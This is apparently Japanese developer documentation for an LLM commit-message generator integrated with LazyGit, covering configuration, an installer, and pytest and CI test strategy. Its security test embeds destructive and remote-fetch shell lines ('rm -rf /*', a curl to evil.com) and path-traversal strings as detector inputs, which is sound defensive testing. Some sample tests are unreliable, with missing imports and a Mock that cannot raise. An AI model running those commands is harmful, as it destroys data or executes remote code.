# LazyGit統合とテスト戦略

## 概要

このドキュメントでは、LazyGit LLM Commit GeneratorのLazyGit統合機能と包括的なテスト戦略について説明します。統合の仕組み、設定方法、テスト手法について詳述します。

## LazyGit統合アーキテクチャ

### 統合フロー

```text
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   LazyGit UI    │    │  Custom Command │    │ LLM Generator   │
│                 │    │                 │    │                 │
│ Files View      │───▶│ Ctrl+G Press    │───▶│ Process Diff    │
│ (Staged Files)  │    │                 │    │                 │
└─────────────────┘    └─────────────────┘    └─────────────────┘
         ▲                                              │
         │               ┌─────────────────┐           ▼
         │               │   Git Diff      │    ┌─────────────────┐
         │               │ --staged        │    │ Generate Message│
         │               │                 │    │                 │
         └───────────────┤ Return to UI    │◀───│ Format & Return │
                         │                 │    │                 │
                         └─────────────────┘    └─────────────────┘
```

### コマンド実行フロー

1. **トリガー**: ユーザーがLazyGitでCtrl+G押下
2. **コマンド実行**: LazyGitが`lazygit-llm-generate`実行
3. **Git差分取得**: `git diff --staged`でステージされた変更を取得
4. **LLM処理**: 設定されたプロバイダーでコミットメッセージ生成
5. **結果返却**: LazyGitに生成されたメッセージを返却
6. **ユーザー確認**: LazyGitでメッセージを表示、編集可能

## LazyGit設定

### カスタムコマンド設定

LazyGitの設定ファイル（`~/.config/lazygit/config.yml`）に以下を追加：

```yaml
# LazyGit統合設定
customCommands:
  - key: '<c-g>'                          # Ctrl+G
    command: 'lazygit-llm-generate'       # 実行コマンド
    context: 'files'                      # Filesコンテキストで有効
    description: 'Generate commit message with LLM'
    stream: true                          # リアルタイム出力
    showOutput: true                      # 出力表示
    subprocess: true                      # サブプロセス実行
```

### 詳細設定オプション

```yaml
customCommands:
  - key: '<c-g>'
    command: 'lazygit-llm-generate'
    context: 'files'
    description: 'AI commit message'
    stream: true
    showOutput: true
    subprocess: true
    
    # 追加オプション
    prompts:
      - type: 'confirm'
        title: 'Generate AI commit message?'
        body: 'This will analyze staged changes and generate a commit message using AI.'
    
    # 実行条件
    whenStagedChanges: true              # ステージされた変更がある場合のみ
    
    # 出力処理
    outputCommand: |
      if [ $? -eq 0 ]; then
        echo "✅ Message generated successfully"
      else
        echo "❌ Failed to generate message"
      fi
```

### マルチコマンド設定

```yaml
customCommands:
  # 標準生成（短いメッセージ）
  - key: '<c-g>'
    command: 'lazygit-llm-generate'
    context: 'files'
    description: 'Generate short commit message'
    stream: true
    
  # 詳細生成（長いメッセージ）
  - key: '<c-G>'                          # Shift+Ctrl+G
    command: 'lazygit-llm-generate --verbose --detailed'
    context: 'files'
    description: 'Generate detailed commit message'
    stream: true
    
  # 日本語生成
  - key: '<c-j>'
    command: 'lazygit-llm-generate --config ~/.config/lazygit-llm/config-ja.yml'
    context: 'files'
    description: 'Generate Japanese commit message'
    stream: true
```

## インストールと設定の自動化

### install.py スクリプト

自動インストールスクリプトの機能：

```python
# install.py の主要機能

class LazyGitLLMInstaller:
    """LazyGit LLM統合の自動インストーラー"""
    
    def __init__(self):
        self.config_dir = Path.home() / '.config' / 'lazygit-llm'
        self.lazygit_config = Path.home() / '.config' / 'lazygit' / 'config.yml'
        self.binary_path = Path.home() / '.local' / 'bin' / 'lazygit-llm-generate'
    
    def install_complete_setup(self):
        """完全なセットアップの実行"""
        print("🚀 LazyGit LLM Commit Generator セットアップ開始")
        
        # 1. 依存関係のインストール
        self.install_dependencies()
        
        # 2. 設定ディレクトリの作成
        self.create_config_directory()
        
        # 3. デフォルト設定ファイルの作成
        self.create_default_config()
        
        # 4. LazyGit統合の設定
        self.setup_lazygit_integration()
        
        # 5. 実行バイナリの作成
        self.create_executable_binary()
        
        # 6. 権限の設定
        self.set_file_permissions()
        
        # 7. テスト実行
        self.test_installation()
        
        print("✅ セットアップ完了！")
    
    def setup_lazygit_integration(self):
        """LazyGit統合の設定"""
        if not self.lazygit_config.parent.exists():
            print("📁 LazyGit設定ディレクトリ作成")
            self.lazygit_config.parent.mkdir(parents=True)
        
        # 既存設定の読み込み
        if self.lazygit_config.exists():
            with open(self.lazygit_config) as f:
                config = yaml.safe_load(f) or {}
        else:
            config = {}
        
        # カスタムコマンドの追加
        if 'customCommands' not in config:
            config['customCommands'] = []
        
        llm_command = {
            'key': '<c-g>',
            'command': 'lazygit-llm-generate',
            'context': 'files',
            'description': 'Generate commit message with LLM',
            'stream': True,
            'showOutput': True
        }
        
        # 重複チェック
        existing_commands = [cmd for cmd in config['customCommands'] 
                           if cmd.get('key') == '<c-g>']
        
        if not existing_commands:
            config['customCommands'].append(llm_command)
            
            # 設定ファイルの書き込み
            with open(self.lazygit_config, 'w') as f:
                yaml.dump(config, f, default_flow_style=False, allow_unicode=True)
            
            print("✅ LazyGit統合設定完了")
        else:
            print("⚠️  LazyGit統合設定は既に存在します")
```

### バイナリラッパー作成

```bash
#!/bin/bash
# lazygit-llm-generate ラッパースクリプト

# 環境の設定
export PYTHONPATH="${PYTHONPATH}:$(dirname "$0")"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# UV環境での実行を試行
if command -v uv &> /dev/null; then
    cd "${SCRIPT_DIR}/../lazygit-llm-commit-generator" 2>/dev/null
    if [ -f "pyproject.toml" ]; then
        exec uv run python lazygit-llm/lazygit_llm/main.py "$@"
    fi
fi

# 通常のPython実行
exec python3 "${SCRIPT_DIR}/../lazygit-llm-commit-generator/lazygit-llm/lazygit_llm/main.py" "$@"
```

## テスト戦略

### テストマーカーの詳細

プロジェクトでは以下のpytestマーカーを使用：

```python
# pyproject.toml の設定
[tool.pytest.ini_options]
markers = [
    "unit: Unit tests - Individual component testing",
    "integration: Integration tests - End-to-end provider testing", 
    "performance: Performance tests - Response time and resource usage",
    "slow: Slow running tests - Can be excluded for fast execution",
]
```

### 1. ユニットテスト戦略

個別コンポーネントの詳細テスト：

```python
# tests/test_config_manager.py

import pytest
from unittest.mock import patch, mock_open
from lazygit_llm.config_manager import ConfigManager, ConfigError, ProviderConfig

@pytest.mark.unit
class TestConfigManager:
    """設定管理のユニットテスト"""
    
    @pytest.fixture
    def sample_config_yaml(self):
        return """
        provider: "openai"
        api_key: "${OPENAI_API_KEY}"
        model_name: "gpt-4"
        timeout: 30
        max_tokens: 100
        prompt_template: |
          Generate commit message for: $diff
        additional_params:
          temperature: 0.3
        """
    
    def test_load_valid_config(self, sample_config_yaml):
        """有効な設定の読み込みテスト"""
        with patch('builtins.open', mock_open(read_data=sample_config_yaml)):
            with patch.dict('os.environ', {'OPENAI_API_KEY': 'test-key'}):
                config_manager = ConfigManager('test_config.yml')
                config = config_manager.load_config()
                
                assert config.provider == "openai"
                assert config.api_key == "test-key"
                assert config.model_name == "gpt-4"
                assert config.timeout == 30
    
    def test_environment_variable_expansion(self):
        """環境変数展開のテスト"""
        config_yaml = 'api_key: "${TEST_KEY:default_value}"'
        
        with patch('builtins.open', mock_open(read_data=config_yaml)):
            # 環境変数が設定されている場合
            with patch.dict('os.environ', {'TEST_KEY': 'actual_value'}):
                config_manager = ConfigManager('test.yml')
                result = config_manager.expand_environment_variables('${TEST_KEY:default}')
                assert result == 'actual_value'
            
            # 環境変数が設定されていない場合
            with patch.dict('os.environ', {}, clear=True):
                result = config_manager.expand_environment_variables('${MISSING_KEY:default}')
                assert result == 'default'
    
    def test_config_validation(self):
        """設定検証のテスト"""
        # 有効な設定
        valid_config = ProviderConfig(
            provider="openai",
            model_name="gpt-4",
            api_key="test-key"
        )
        config_manager = ConfigManager()
        assert config_manager.validate_config(valid_config) == True
        
        # 無効な設定（必須項目欠如）
        invalid_config = ProviderConfig(
            provider="openai",
            model_name="",  # 空のモデル名
            api_key="test-key"
        )
        assert config_manager.validate_config(invalid_config) == False
```

### 2. 統合テスト戦略

エンドツーエンドのテスト：

```python
# tests/integration/test_lazygit_integration.py

import pytest
import subprocess
import tempfile
import os
from pathlib import Path

@pytest.mark.integration
class TestLazyGitIntegration:
    """LazyGit統合のテスト"""
    
    @pytest.fixture
    def temp_git_repo(self):
        """テスト用Gitリポジトリの作成"""
        with tempfile.TemporaryDirectory() as tmpdir:
            repo_path = Path(tmpdir)
            
            # Git初期化
            subprocess.run(['git', 'init'], cwd=repo_path, check=True)
            subprocess.run(['git', 'config', 'user.name', 'Test User'], cwd=repo_path)
            subprocess.run(['git', 'config', 'user.email', 'test@example.com'], cwd=repo_path)
            
            # テストファイル作成
            test_file = repo_path / 'test.py'
            test_file.write_text('print("Hello, World!")')
            
            # ファイルをステージング
            subprocess.run(['git', 'add', 'test.py'], cwd=repo_path)
            
            yield repo_path
    
    def test_binary_execution(self, temp_git_repo):
        """バイナリ実行のテスト"""
        # 環境変数の設定
        env = os.environ.copy()
        env['OPENAI_API_KEY'] = 'test-key'
        
        # lazygit-llm-generate の実行
        result = subprocess.run(
            ['python', '-m', 'lazygit_llm.main', '--test-config'],
            cwd=temp_git_repo,
            env=env,
            capture_output=True,
            text=True
        )
        
        # 基本的な実行チェック
        assert result.returncode in [0, 1]  # 設定エラーは許容
        assert 'lazygit-llm' in result.stdout.lower() or 'error' in result.stderr.lower()
    
    def test_git_diff_processing(self, temp_git_repo):
        """Git差分処理のテスト"""
        from lazygit_llm.git_processor import GitDiffProcessor
        
        processor = GitDiffProcessor()
        diff_data = processor.get_staged_diff()
        
        # 差分データの検証
        assert diff_data.raw_diff
        assert diff_data.file_count > 0
        assert diff_data.line_additions > 0
        assert not diff_data.is_binary
        assert 'test.py' in diff_data.raw_diff
    
    def test_end_to_end_with_mock_provider(self, temp_git_repo):
        """モックプロバイダーでのエンドツーエンドテスト"""
        # モック設定ファイル作成
        config_content = """
        provider: "mock"
        model_name: "test-model"
        api_key: "test-key"
        prompt_template: "Generate: $diff"
        """
        
        config_file = temp_git_repo / 'test_config.yml'
        config_file.write_text(config_content)
        
        # MockProviderの実装（テスト用）
        with patch('lazygit_llm.provider_factory.ProviderFactory.create_provider') as mock_factory:
            mock_provider = Mock()
            mock_provider.generate_commit_message.return_value = "feat: add test file"
            mock_provider.test_connection.return_value = True
            mock_factory.return_value = mock_provider
            
            # メイン処理の実行
            from lazygit_llm.main import main
            with patch('sys.argv', ['main', '--config', str(config_file)]):
                with patch('sys.stdin', StringIO('diff --git a/test.py')):
                    result = main()
            
            assert result == 0
            mock_provider.generate_commit_message.assert_called_once()
```

### 3. パフォーマンステスト

```python
# tests/performance/test_performance.py

import pytest
import time
import psutil
from unittest.mock import Mock, patch

@pytest.mark.performance
class TestPerformance:
    """パフォーマンステスト"""
    
    def test_config_loading_performance(self):
        """設定読み込みの性能テスト"""
        from lazygit_llm.config_manager import ConfigManager
        
        start_time = time.time()
        start_memory = psutil.Process().memory_info().rss
        
        # 100回の設定読み込み
        for _ in range(100):
            config_manager = ConfigManager()
            # モック設定での読み込み
            with patch('builtins.open'), patch('yaml.safe_load'):
                config_manager.load_config()
        
        elapsed_time = time.time() - start_time
        memory_used = psutil.Process().memory_info().rss - start_memory
        
        # 性能要件
        assert elapsed_time < 1.0  # 1秒以内
        assert memory_used < 10 * 1024 * 1024  # 10MB以内
        
        print(f"設定読み込み性能: {elapsed_time:.3f}s, メモリ: {memory_used/1024/1024:.1f}MB")
    
    def test_diff_processing_performance(self):
        """差分処理の性能テスト"""
        from lazygit_llm.git_processor import GitDiffProcessor
        
        # 大きな差分データの作成
        large_diff = "diff --git a/large_file.py b/large_file.py\n"
        large_diff += "+print('Hello')\n" * 1000  # 1000行の追加
        
        processor = GitDiffProcessor()
        
        start_time = time.time()
        
        with patch('subprocess.run') as mock_run:
            mock_run.return_value.stdout = large_diff
            mock_run.return_value.returncode = 0
            
            diff_data = processor.get_staged_diff()
        
        elapsed_time = time.time() - start_time
        
        # 性能要件
        assert elapsed_time < 0.1  # 100ms以内
        assert diff_data.line_additions == 1000
        
        print(f"差分処理性能: {elapsed_time:.3f}s")
    
    @pytest.mark.slow
    def test_provider_response_time(self):
        """プロバイダー応答時間のテスト"""
        from lazygit_llm.provider_factory import ProviderFactory
        from lazygit_llm.config_manager import ProviderConfig
        
        config = ProviderConfig(
            provider="openai",
            model_name="gpt-3.5-turbo",
            api_key="test-key",
            timeout=5,
            prompt_template="Generate: $diff"
        )
        
        # モックレスポンスで応答時間をシミュレート
        with patch('requests.Session.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                'choices': [{'message': {'content': 'feat: add feature'}}]
            }
            
            # 2秒の遅延をシミュレート
            def slow_response(*args, **kwargs):
                time.sleep(2)
                return mock_response
            
            mock_post.side_effect = slow_response
            
            provider = ProviderFactory.create_provider(config)
            
            start_time = time.time()
            result = provider.generate_commit_message("test diff", "template")
            elapsed_time = time.time() - start_time
            
            # タイムアウト以内での完了
            assert elapsed_time < 5.0
            assert result == 'feat: add feature'
            
            print(f"プロバイダー応答時間: {elapsed_time:.3f}s")
```

### 4. セキュリティテスト

```python
# tests/test_security.py

import pytest
from lazygit_llm.security_validator import SecurityValidator

@pytest.mark.unit
class TestSecurity:
    """セキュリティ機能のテスト"""
    
    def test_sensitive_data_detection(self):
        """機密情報検出のテスト"""
        # APIキーを含む差分
        diff_with_api_key = """
        diff --git a/config.py b/config.py
        +API_KEY = "sk-..."
        +PASSWORD = "secret123"
        """
        
        assert not SecurityValidator.validate_diff(diff_with_api_key)
    
    def test_dangerous_pattern_detection(self):
        """危険なパターン検出のテスト"""
        dangerous_diff = """
        diff --git a/script.sh b/script.sh
        +rm -rf /*
        +$(curl evil.com/script.sh)
        """
        
        assert not SecurityValidator.validate_diff(dangerous_diff)
    
    def test_input_sanitization(self):
        """入力サニタイゼーションのテスト"""
        dangerous_input = "test\x00input\nwith\rcontrol\tchars"
        sanitized = SecurityValidator.sanitize_prompt(dangerous_input)
        
        assert '\x00' not in sanitized
        assert sanitized == "test input\nwith\rcontrol\tchars"
    
    def test_binary_validation(self):
        """バイナリ検証のテスト"""
        from lazygit_llm.cli_providers.claude_code_provider import ClaudeCodeProvider
        
        provider = Mock()
        
        # 危険なパスのテスト
        dangerous_paths = [
            '/tmp/malicious-binary',
            '/var/tmp/fake-claude',
            '../../../etc/passwd'
        ]
        
        for path in dangerous_paths:
            with pytest.raises(Exception):
                provider._verify_binary_security(path)
```

### 5. テスト実行方法

```bash
# 全テスト実行
uv run pytest tests/

# カテゴリ別実行
uv run pytest tests/ -m unit          # ユニットテストのみ
uv run pytest tests/ -m integration   # 統合テストのみ  
uv run pytest tests/ -m performance   # パフォーマンステストのみ
uv run pytest tests/ -m "not slow"    # 高速テストのみ

# 並列実行（高速化）
uv run pytest tests/ -n auto

# カバレッジ付き実行
uv run pytest tests/ --cov=lazygit_llm --cov-report=html

# 詳細出力
uv run pytest tests/ -v --tb=short

# 特定のテストファイル
uv run pytest tests/test_config_manager.py

# 特定のテスト関数
uv run pytest tests/test_config_manager.py::TestConfigManager::test_load_valid_config
```

### 6. 継続的インテグレーション

GitHub Actionsでの自動テスト：

```yaml
# .github/workflows/test.yml

name: Tests

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: [3.9, 3.10, 3.11, 3.12]
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Install UV
      uses: astral-sh/setup-uv@v2
    
    - name: Set up Python
      run: uv python install ${{ matrix.python-version }}
    
    - name: Install dependencies
      run: uv sync --extra dev
    
    - name: Run unit tests
      run: uv run pytest tests/ -m "unit and not slow" --cov=lazygit_llm
    
    - name: Run integration tests
      run: uv run pytest tests/ -m "integration and not slow"
    
    - name: Upload coverage
      uses: codecov/codecov-action@v3
```

## トラブルシューティング

### LazyGit統合の問題

#### 1. Ctrl+Gが動作しない

**症状**: LazyGitでCtrl+Gを押しても何も起こらない

**診断**:
```bash
# LazyGit設定確認
cat ~/.config/lazygit/config.yml | grep -A 10 customCommands

# バイナリ存在確認  
which lazygit-llm-generate
ls -la ~/.local/bin/lazygit-llm-generate

# 権限確認
ls -la ~/.local/bin/lazygit-llm-generate
```

**解決方法**:
```bash
# 設定ファイル再生成
uv run python install.py

# 権限修正
chmod +x ~/.local/bin/lazygit-llm-generate

# PATHの確認と追加
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc
```

#### 2. コマンド実行エラー

**症状**: `Command not found: lazygit-llm-generate`

**解決方法**:
```bash
# 直接実行での確認
uv run python lazygit-llm/lazygit_llm/main.py --test-config

# ラッパースクリプト確認
cat ~/.local/bin/lazygit-llm-generate

# UV環境確認
which uv
uv --version
```

### テスト関連の問題

#### 1. テスト依存関係エラー

```bash
# 開発依存関係のインストール
uv sync --extra dev

# 特定パッケージの追加インストール  
uv add --dev pytest-mock pytest-cov
```

#### 2. パフォーマンステスト失敗

```bash
# システムリソース確認
top
free -h

# テストタイムアウト調整
uv run pytest tests/performance/ --timeout=60
```

---

この統合とテスト戦略により、LazyGit LLM Commit Generatorは堅牢で信頼性の高いLazyGit統合を実現し、包括的なテストカバレッジを提供します。